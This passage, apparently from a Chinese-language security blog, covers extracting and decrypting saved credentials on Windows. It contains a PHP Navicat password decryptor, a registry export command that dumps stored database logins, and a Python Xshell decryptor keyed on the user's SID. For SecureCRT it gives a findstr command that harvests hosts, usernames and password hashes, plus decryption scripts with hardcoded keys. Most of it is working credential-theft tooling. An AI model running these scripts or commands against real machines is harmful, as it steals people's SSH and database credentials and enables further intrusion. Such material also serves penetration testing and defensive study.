class="number">11</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decryptEleven</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">                <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">decryptTwelve</span>(<span class="variable">$string</span>);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptEleven</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$upperString</span>));</span><br><span class="line">        </span><br><span class="line">        <span class="variable">$round</span> = <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">floor</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) / <span class="number">8</span>));</span><br><span class="line">        <span class="variable">$leftLength</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$string</span>) % <span class="number">8</span>;</span><br><span class="line">        <span class="variable">$result</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;blowIv;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$round</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$encryptedBlock</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="number">8</span>);</span><br><span class="line">            <span class="variable">$temp</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">decryptBlock</span>(<span class="variable">$encryptedBlock</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="variable">$currentVector</span>, <span class="variable">$encryptedBlock</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable">$temp</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$leftLength</span>) &#123;</span><br><span class="line">            <span class="variable">$currentVector</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">encryptBlock</span>(<span class="variable">$currentVector</span>);</span><br><span class="line">            <span class="variable">$result</span> .= <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">xorBytes</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$string</span>, <span class="number">8</span> * <span class="variable">$i</span>, <span class="variable">$leftLength</span>), <span class="variable">$currentVector</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">decryptTwelve</span>(<span class="params"><span class="variable">$upperString</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$string</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="title function_ invoke__">strtolower</span>(<span class="variable">$upperString</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$string</span>, <span class="string">&#x27;AES-128-CBC&#x27;</span>, <span class="variable">$this</span>-&gt;aesKey, OPENSSL_RAW_DATA, <span class="variable">$this</span>-&gt;aesIv);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="keyword">use</span> <span class="title">FatSmallTools</span>\<span class="title">NavicatPassword</span>;</span><br><span class="line"> </span><br><span class="line"><span class="comment">//需要指定版本，11或12</span></span><br><span class="line"><span class="variable">$navicatPassword</span> = <span class="keyword">new</span> <span class="title class_">NavicatPassword</span>(<span class="number">11</span>);</span><br><span class="line"><span class="comment">//填上你的加密的密码</span></span><br><span class="line"><span class="variable">$decode</span> = <span class="variable">$navicatPassword</span>-&gt;<span class="title function_ invoke__">decrypt</span>(<span class="string">&#x27;EF176B08C2D7735DB81C&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$decode</span>.<span class="string">&quot;\n&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="不能RDP连接到机器"><a href="#不能RDP连接到机器" class="headerlink" title="不能RDP连接到机器"></a>不能RDP连接到机器</h4><p>使用命令来保存注册列表的值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">reg export HKCU\SOFTWARE\PremiumSoft\Navicat\Servers navicat</span><br></pre></td></tr></table></figure><p>提取出来的内容如下，解密方式和上面一样</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Windows Registry Editor Version 5.00</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers]</span><br><span class="line"></span><br><span class="line">[HKEY_CURRENT_USER\SOFTWARE\PremiumSoft\Navicat\Servers\test]</span><br><span class="line">&quot;ConnType&quot;=&quot;ctMYSQL&quot;</span><br><span class="line">&quot;ConnTypeOra&quot;=&quot;ctoBasic&quot;</span><br><span class="line">&quot;TNS&quot;=&quot;&quot;</span><br><span class="line">&quot;DatabaseFileName&quot;=&quot;&quot;</span><br><span class="line">&quot;Host&quot;=&quot;127.0.0.1&quot;</span><br><span class="line">&quot;Port&quot;=dword:00000cea</span><br><span class="line">&quot;InitialDatabase&quot;=&quot;&quot;</span><br><span class="line">&quot;OraServiceNameType&quot;=&quot;snServiceName&quot;</span><br><span class="line">&quot;MSSQLAuthenMode&quot;=&quot;mamSQLServer&quot;</span><br><span class="line">&quot;UserName&quot;=&quot;root&quot;</span><br><span class="line">&quot;Pwd&quot;=&quot;EF176B08C2D7735DB81C&quot;</span><br><span class="line">&quot;AskPassword&quot;=&quot;false&quot;</span><br><span class="line">&quot;Codepage&quot;=dword:0000fde9</span><br><span class="line">&quot;OraRole&quot;=&quot;orDefault&quot;</span><br><span class="line">&quot;OraOSAuthentication&quot;=dword:00000000</span><br><span class="line">&quot;AutoConnect&quot;=dword:00000000</span><br><span class="line">&quot;QuerySavePath&quot;=&quot;C:\\Users\\ascotbe\\Documents\\Navicat\\MySQL\\servers\\test&quot;</span><br><span class="line">&quot;UseCompression&quot;=dword:00000000</span><br><span class="line">&quot;UseCharacterSet&quot;=dword:00000001</span><br><span class="line">&quot;UsePingInterval&quot;=dword:00000000</span><br><span class="line">&quot;PingInterval&quot;=dword:000000f0</span><br><span class="line">&quot;UseNamedPipe&quot;=dword:00000000</span><br><span class="line">&quot;NamedPipeSocket&quot;=&quot;/tmp/mysql.sock&quot;</span><br><span class="line">&quot;SQLiteEncrypted&quot;=dword:00000000</span><br><span class="line">&quot;UseEncryption&quot;=dword:00000000</span><br><span class="line">&quot;UseAdvSettings&quot;=&quot;false&quot;</span><br><span class="line">&quot;UseSSL&quot;=dword:00000000</span><br><span class="line">&quot;UseSSLAuthen&quot;=dword:00000000</span><br><span class="line">&quot;PGSSLMode&quot;=&quot;smRequire&quot;</span><br><span class="line">&quot;ClientKey&quot;=&quot;&quot;</span><br><span class="line">&quot;ClientCert&quot;=&quot;&quot;</span><br><span class="line">&quot;CACert&quot;=&quot;&quot;</span><br><span class="line">&quot;VerifyCACert&quot;=dword:00000000</span><br><span class="line">&quot;Cipher&quot;=&quot;&quot;</span><br><span class="line">&quot;PGSSLCRL&quot;=&quot;&quot;</span><br><span class="line">&quot;UseSSH&quot;=dword:00000000</span><br><span class="line">&quot;SSH_Host&quot;=&quot;&quot;</span><br><span class="line">&quot;SSH_Port&quot;=dword:00000016</span><br><span class="line">&quot;SSH_UserName&quot;=&quot;&quot;</span><br><span class="line">&quot;SSH_AuthenMethod&quot;=&quot;saPassword&quot;</span><br><span class="line">&quot;SSH_SavePassword&quot;=dword:00000000</span><br><span class="line">&quot;SSH_PrivateKey&quot;=&quot;&quot;</span><br><span class="line">&quot;SSH_SavePassphrase&quot;=dword:00000000</span><br><span class="line">&quot;UseHTTP&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_URL&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_EncodeBase64&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_Authen&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_Username&quot;=&quot;&quot;</span><br><span class="line">&quot;HttpSavePassword&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_CertAuth&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_ClientKey&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_ClientCert&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_CACert&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_Passphrase&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_Proxy&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_ProxyHost&quot;=&quot;&quot;</span><br><span class="line">&quot;HTTP_ProxyPort&quot;=dword:00000000</span><br><span class="line">&quot;HTTP_ProxyUsername&quot;=&quot;&quot;</span><br><span class="line">&quot;HttpProxySavePassword&quot;=dword:00000000</span><br><span class="line">&quot;NSYID&quot;=&quot;&quot;</span><br><span class="line">&quot;NSYHash&quot;=&quot;&quot;</span><br><span class="line">&quot;NSYNavicatID&quot;=&quot;&quot;</span><br><span class="line">&quot;NSYDirtyFlag&quot;=dword:00000000</span><br><span class="line">&quot;AskForSavePassword&quot;=dword:00000000</span><br></pre></td></tr></table></figure><h2 id="SSH密码"><a href="#SSH密码" class="headerlink" title="SSH密码"></a>SSH密码</h2><h3 id="Xshell密码"><a href="#Xshell密码" class="headerlink" title="Xshell密码"></a>Xshell密码</h3><p>默认保存路径</p><div class="table-container"><table><thead><tr><th>版本</th><th>路径</th></tr></thead><tbody><tr><td>Xshell 5</td><td>%userprofile%\Documents\NetSarang\Xshell\Sessions</td></tr><tr><td>Xshell 6</td><td>%userprofile%\Documents\NetSarang Computer\6\Xshell\Sessions</td></tr><tr><td>Xshell 7</td><td>%userprofile%\Documents\NetSarang Computer\7\Xshell\Sessions</td></tr></tbody></table></div><p>关于xshell加密方式可以查看<a href="https://rcoil.me/2019/09/%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91SharpDecryptPwd/">这篇文章</a></p><h4 id="Xshell-5-amp-Xshell-6"><a href="#Xshell-5-amp-Xshell-6" class="headerlink" title="Xshell 5&amp;Xshell 6"></a>Xshell 5&amp;Xshell 6</h4><p>首先需获取到用户的SID值</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">PS C:\Users\ascotbe&gt; whoami /user</span><br><span class="line"></span><br><span class="line">用户信息</span><br><span class="line">----------------</span><br><span class="line"></span><br><span class="line">用户名           SID</span><br><span class="line">================ ==============================================</span><br><span class="line">樱岛麻衣\ascotbe S-1-5-21-1645164750-2672341361-3879437546-1000</span><br></pre></td></tr></table></figure><p>然后使用脚本解密</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python .\xshell.py -s username+sid -p <span class="string">&quot;文件路径&quot;</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/19.png" alt="image-20210611142341029"></p><p>脚本代码如下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> configparser</span><br><span class="line"><span class="comment">#pip install pycryptodome</span></span><br><span class="line"><span class="comment">#pip install pywin32</span></span><br><span class="line"><span class="keyword">from</span> win32api <span class="keyword">import</span> GetComputerName, GetUserName</span><br><span class="line"><span class="keyword">from</span> win32security <span class="keyword">import</span> LookupAccountName, ConvertSidToStringSid</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_string</span>(<span class="params">a1, a2</span>):</span><br><span class="line">    v1 = base64.b64decode(a2)</span><br><span class="line">    v3 = ARC4.new(SHA256.new(a1.encode(<span class="string">&#x27;ascii&#x27;</span>)).digest()).decrypt(v1[:<span class="built_in">len</span>(v1) - <span class="number">0x20</span>])</span><br><span class="line">    <span class="keyword">if</span> SHA256.new(v3).digest() == v1[-<span class="number">32</span>:]:</span><br><span class="line">        <span class="keyword">return</span> v3.decode(<span class="string">&#x27;ascii&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&quot;xsh, xfp password decrypt&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-s&quot;</span>, <span class="string">&quot;--sid&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;`username`+`sid`, user `whoami /user` in command.&quot;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&quot;-p&quot;</span>, <span class="string">&quot;--password&quot;</span>, default=<span class="string">&quot;&quot;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;the password in sessions or path of sessions&quot;</span>)</span><br><span class="line">args = parser.parse_args()</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.sid:</span><br><span class="line">    args.sid = GetUserName() + ConvertSidToStringSid(LookupAccountName(GetComputerName(), GetUserName())[<span class="number">0</span>])</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.password:</span><br><span class="line">    args.password = os.path.join(os.environ[<span class="string">&quot;USERPROFILE&quot;</span>], <span class="string">r&quot;Documents\NetSarang Computer\6&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.path.isdir(args.password):</span><br><span class="line">    r = decrypt_string(args.sid, args.password)</span><br><span class="line">    <span class="keyword">if</span> r:</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root, dirs, files <span class="keyword">in</span> os.walk(args.password):</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> files:</span><br><span class="line">        <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xsh&quot;</span>) <span class="keyword">or</span> f.endswith(<span class="string">&quot;.xfp&quot;</span>):</span><br><span class="line">            filepath = os.path.join(root, f)</span><br><span class="line">            cfg = configparser.ConfigParser()</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                cfg.read(filepath)</span><br><span class="line">            <span class="keyword">except</span> UnicodeDecodeError:</span><br><span class="line">                cfg.read(filepath, encoding=<span class="string">&quot;utf-16&quot;</span>)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                <span class="keyword">if</span> f.endswith(<span class="string">&quot;.xsh&quot;</span>):</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;CONNECTION&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;CONNECTION:AUTHENTICATION&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    host = <span class="string">&quot;&#123;&#125;:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Host&quot;</span>], cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Port&quot;</span>])</span><br><span class="line">                    username = cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;UserName&quot;</span>]</span><br><span class="line">                    password = decrypt_string(args.sid, cfg[<span class="string">&quot;Connection&quot;</span>][<span class="string">&quot;Password&quot;</span>])</span><br><span class="line">                <span class="built_in">print</span>(</span><br><span class="line">                    <span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nHost:     <span class="subst">&#123;host&#125;</span>\nUsername: <span class="subst">&#123;username&#125;</span>\nPassword: <span class="subst">&#123;password&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;filepath:=^<span class="number">100</span>&#125;</span>\nError:<span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h4 id="Xshell-7"><a href="#Xshell-7" class="headerlink" title="Xshell 7"></a>Xshell 7</h4><p>这个版本目前我没有找到解密方式，只能使用比较蠢的方式</p><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/20.gif" alt="1"></p><p>星号密码查看器：<a href="https://github.com/Ascotbe/Image/blob/master/WindowsGrabPassword/ViewPass.exe">备份下载</a></p><h3 id="SecureCRT密码"><a href="#SecureCRT密码" class="headerlink" title="SecureCRT密码"></a>SecureCRT密码</h3><p>保存位置如下，绿色版本的话在下载的文件夹中</p><div class="table-container"><table><thead><tr><th>版本</th><th>路径</th></tr></thead><tbody><tr><td>全版本通用</td><td>%APPDATA%\VanDyke\Config\Sessions</td></tr></tbody></table></div><h4 id="小于7-X版本"><a href="#小于7-X版本" class="headerlink" title="小于7.X版本"></a>小于7.X版本</h4><p>把<code>*.ini</code>文件拉取下来直接使用脚本解密，这个版本没有测试过</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Decrypt SSHv2 passwords stored in VanDyke SecureCRT session files</span></span><br><span class="line"><span class="comment"># Can be found on Windows in:</span></span><br><span class="line"><span class="comment">#   %APPDATA%\VanDyke\Config\Sessions\sessionname.ini</span></span><br><span class="line"><span class="comment"># Tested with version 7.2.6 (build 606) for Windows</span></span><br><span class="line"><span class="comment"># Eloi Vanderbeken - Synacktiv</span></span><br><span class="line"><span class="comment">#  Decrypt SSHv2 passwords stored in VanDyke SecureCRT</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py -h</span></span><br><span class="line"><span class="comment"># usage: SecureCRT-decryptpass.py [-h] files [files ...]</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#positional arguments:</span></span><br><span class="line"><span class="comment">#  files       session file(s)</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment">#optional arguments:</span></span><br><span class="line"><span class="comment">#  -h, --help  show this help message and exit</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># C:\&gt;python SecureCRT-decryptpass.py C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># C:\Users\user1\AppData\Roaming\VanDyke\Config\Sessions\192.168.0.1.ini</span></span><br><span class="line"><span class="comment"># ssh -p 22 user@192.168.0.1 # 123456</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> Blowfish</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">password</span>) :</span><br><span class="line">    c1 = Blowfish.new(<span class="string">&#x27;5F B0 45 A2 94 17 D9 16 C6 C6 A2 FF 06 41 82 B7&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    c2 = Blowfish.new(<span class="string">&#x27;24 A6 3D DE 5B D3 B3 82 9C 7E 06 F4 08 16 AA 07&#x27;</span>.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>).decode(<span class="string">&#x27;hex&#x27;</span>), Blowfish.MODE_CBC, <span class="string">&#x27;\x00&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    padded = c1.decrypt(c2.decrypt(password.decode(<span class="string">&#x27;hex&#x27;</span>))[<span class="number">4</span>:-<span class="number">4</span>])</span><br><span class="line">    p = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> padded[:<span class="number">2</span>] != <span class="string">&#x27;\x00\x00&#x27;</span> :</span><br><span class="line">        p += padded[:<span class="number">2</span>]</span><br><span class="line">        padded = padded[<span class="number">2</span>:]</span><br><span class="line">    <span class="keyword">return</span> p.decode(<span class="string">&#x27;UTF-16&#x27;</span>)</span><br><span class="line"></span><br><span class="line">REGEX_HOSTNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Hostname&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line">REGEX_PASWORD = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Password&quot;=u([0-9a-f]+)&#x27;</span>)</span><br><span class="line">REGEX_PORT = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;D:&quot;\[SSH2\] Port&quot;=([0-9a-f]&#123;8&#125;)&#x27;</span>)</span><br><span class="line">REGEX_USERNAME = re.<span class="built_in">compile</span>(u<span class="string">r&#x27;S:&quot;Username&quot;=([^\r\n]*)&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hostname</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_HOSTNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">password</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_PASWORD.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> decrypt(m.group(<span class="number">1</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;???&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">port</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_PORT.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;-p %d &#x27;</span>%(<span class="built_in">int</span>(m.group(<span class="number">1</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">username</span>(<span class="params">x</span>) :</span><br><span class="line">    m = REGEX_USERNAME.search(x)</span><br><span class="line">    <span class="keyword">if</span> m :</span><br><span class="line">        <span class="keyword">return</span> m.group(<span class="number">1</span>) + <span class="string">&#x27;@&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">parser = argparse.ArgumentParser(description=<span class="string">&#x27;Tool to decrypt SSHv2 passwords in VanDyke Secure CRT session files&#x27;</span>)</span><br><span class="line">parser.add_argument(<span class="string">&#x27;files&#x27;</span>, <span class="built_in">type</span>=argparse.FileType(<span class="string">&#x27;r&#x27;</span>), nargs=<span class="string">&#x27;+&#x27;</span>,</span><br><span class="line">    <span class="built_in">help</span>=<span class="string">&#x27;session file(s)&#x27;</span>)</span><br><span class="line"></span><br><span class="line">args = parser.parse_args()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> f <span class="keyword">in</span> args.files :</span><br><span class="line">    c = f.read().replace(<span class="string">&#x27;\x00&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span> f.name</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;ssh %s%s%s # %s&quot;</span>%(port(c), username(c), hostname(c), password(c))</span><br></pre></td></tr></table></figure><h4 id="7-X版本"><a href="#7-X版本" class="headerlink" title="7.X版本"></a>7.X版本</h4><p>进入目录提取文件中的连接IP、端口、账号、hash</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">findstr /si /c:&quot;Hostname&quot; /c:&quot;\&quot;Username\&quot;=&quot; /c:&quot;\&quot;Password\&quot;=&quot; /c:&quot;\&quot;[SSH2] Port\&quot;=&quot; *.ini</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/21.png" alt="image-20210611152808283"></p><p>然后使用脚本进行解密</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#注意去除hash的第一位 &quot;u&quot;</span><br><span class="line">python3  SecureCRT.py dec hash</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/Ascotbe/Image/master/WindowsGrabPassword/22.png" alt="image-20210611153105145"></p><p>解密脚本</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES, Blowfish</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">SecureCRTCrypto</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Initialize SecureCRTCrypto object.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        self.IV = <span class="string">b&#x27;\x00&#x27;</span> * Blowfish.block_size</span><br><span class="line">        self.Key1 = <span class="string">b&#x27;\x24\xA6\x3D\xDE\x5B\xD3\xB3\x82\x9C\x7E\x06\xF4\x08\x16\xAA\x07&#x27;</span></span><br><span class="line">        self.Key2 = <span class="string">b&#x27;\x5F\xB0\x45\xA2\x94\x17\xD9\x16\xC6\xC6\xA2\xFF\x06\x41\x82\xB7&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Encrypt</span>(<span class="params">self, Plaintext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Encrypt plaintext and return corresponding ciphertext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Plaintext: A string that will be encrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Hexlified ciphertext string.</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line">        plain_bytes = Plaintext.encode(<span class="string">&#x27;utf-16-le&#x27;</span>)</span><br><span class="line">        plain_bytes += <span class="string">b&#x27;\x00\x00&#x27;</span></span><br><span class="line">        padded_plain_bytes = plain_bytes + os.urandom(Blowfish.block_size - <span class="built_in">len</span>(plain_bytes) % Blowfish.block_size)</span><br><span class="line"></span><br><span class="line">        cipher1 = Blowfish.new(self.Key1, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        cipher2 = Blowfish.new(self.Key2, Blowfish.MODE_CBC, iv = self.IV)</span><br><span class="line">        <span class="keyword">return</span> cipher1.encrypt(os.urandom(<span class="number">4</span>) + cipher2.encrypt(padded_plain_bytes) + os.urandom(<span class="number">4</span>)).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">Decrypt</span>(<span class="params">self, Ciphertext : <span class="built_in">str</span></span>):</span><br><span class="line">        <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        Decrypt ciphertext and return corresponding plaintext.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Args:</span></span><br><span class="line"><span class="string">            Ciphertext: A hex string that will be decrypted.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        Returns:</span></span><br><span class="line"><span class="string">            Plaintext string.</span></span><br><span class="line"><span class="string">        